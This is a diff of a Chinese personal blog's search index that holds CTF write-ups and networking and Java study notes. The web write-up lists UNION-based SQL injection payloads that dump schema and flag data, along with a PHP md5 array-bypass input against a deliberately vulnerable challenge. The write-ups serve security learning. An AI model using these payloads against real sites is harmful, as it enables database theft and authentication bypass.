+<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
+<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
+<p>关注公众号，回复“一句话”即可</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
+<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
+<p>列换位密码，用密码学实验的脚本跑一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
+<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
+<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<p>一个数字型SQL回显注入</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222156910.png" alt="image-20200529222156910"></p>
+<p>首先猜出字段数为4</p>
+<p>联合查询得到数据库名</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
+<p>数据表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
+<p>列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
+<p>读取数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
+<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
 ]]></content>
       <categories>
         <category>CTF</category>
-        <category>web</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>CTF</tag>
-        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>国赛2020WP</title>
+    <url>/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
+    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="签到"><a class="header-anchor" href="#签到"></a>签到</h3>
+<p>助力即可得到flag</p>
+<h3 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h3>
+<p>解压得到二进制文件:flag</p>
+<p>使用winhex打开</p>
+<p>观察到</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
+<p>即flag的值</p>
+<h3 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h3>
+<p>解压缩包得到disk_dump文件</p>
+<p>使用file 命令查看信息</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
+<p>可以看到是ext3的文件系统</p>
+<p>挂载到 test文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount .&#x2F;disk_dump .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
+<p>查看???.png，提示flag已被删除</p>
+<p>使用extundelete恢复被删除的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete .&#x2F;disk_dump --restore-all</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
+<p>得到flag.txt，但打开后是乱码</p>
+<p>返回test/misc01文件夹下，看到可执行文件demo</p>
+<p>使用strings命令查看</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
+<p>猜测demo对flag.txt进行了处理</p>
+<p>使用ida反编译查看其伪源码</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
+<p>编写代码对flag文件进行解码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fileOld = fopen(<span class="string">"D:\\flag.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">    FILE *fileNew = fopen(<span class="string">"D:\\flagNew.txt"</span>,<span class="string">"rb+"</span>);</span><br><span class="line">    <span class="keyword">char</span> v1,v4,v5;</span><br><span class="line">    v4 = <span class="number">34</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = fgetc(fileOld);</span><br><span class="line">        <span class="keyword">if</span>( v1 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fputc(((v1^v4)-v5),fileNew);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fileNew);</span><br><span class="line">    fclose(fileOld);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解码后得到flag</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<p>只做出来一道题</p>
+<h3 id="baby"><a class="header-anchor" href="#baby"></a>baby</h3>
+<p>一道RSA的密码学题目</p>
+<p>给了我们密文c和因数n，e很小。所以可以通过爆破的方式跑出明文</p>
+<p>解密脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">n &#x3D; 691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271</span><br><span class="line">c &#x3D; 3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while 1:</span><br><span class="line">    if(gmpy.root(c+i*n, 3)[1]&#x3D;&#x3D;1):</span><br><span class="line">        print gmpy.root(c+i*n, 3)</span><br><span class="line">        break</span><br><span class="line">    i &#x3D; i+1</span><br></pre></td></tr></table></figure>
+<p>结果是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br></pre></td></tr></table></figure>
+<p>再解码得到flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br><span class="line">print(libnum.n2s(n))</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200920135022901.png" alt="image-20200920135022901"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1437,6 +1534,130 @@
       </tags>
   </entry>
   <entry>
+    <title>指令集和操作系统位数</title>
+    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
+<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
+<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
+<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
+<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
+<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
+<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
+<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
+<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP&amp;IP</title>
+    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
+    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
+<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
+<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
+<ul>
+<li>
+<p>三次握手</p>
+<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
+<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
+<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
+<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
+<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
+<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
+<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
+</li>
+<li>
+<p>四次挥手</p>
+<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
+<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
+<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
+</li>
+</ul>
+<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
+<p>有连接/无连接（可靠/不可靠）</p>
+<p>有拆分合并/无拆分合并</p>
+<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
+<p>单播/多播</p>
+<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
+<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
+<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
+<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
+<p>http1.0 vs http1.1</p>
+<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
+<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
+<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
+<ul>
+<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
+<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
+<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
+<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
+<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
+<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
+<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
+<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
+</ul>
+<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
+<ul>
+<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 异常及处理</title>
+    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
+<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
+<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+<p>不处理异常，将异常抛出给调用者。</p>
+<p><code>throw</code>  、<code>throws</code></p>
+<p>（挖坑待填）</p>
+<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
+<ol>
+<li>可能出现异常的代码用<code>try</code>块括起来</li>
+<li>用<code>catch</code>块来捕获异常并处理异常</li>
+<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
+</ol>
+<p><strong>代码执行过程的三种情况</strong></p>
+<ol>
+<li>
+<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
+</li>
+</ol>
+<blockquote>
+<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
+<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OSI模型</title>
     <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
     <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
@@ -1468,67 +1689,23 @@
       </tags>
   </entry>
   <entry>
-    <title>ACTF校赛Web</title>
-    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
-    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
-<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
-<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
-<p>关注公众号，回复“一句话”即可</p>
-<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
-<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
-<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
-<p>列换位密码，用密码学实验的脚本跑一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
-<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
-<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<p>一个数字型SQL回显注入</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222156910.png" alt="image-20200529222156910"></p>
-<p>首先猜出字段数为4</p>
-<p>联合查询得到数据库名</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
-<p>数据表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
-<p>列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
-<p>读取数据</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
-<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
+    <title>Java-GUI编程</title>
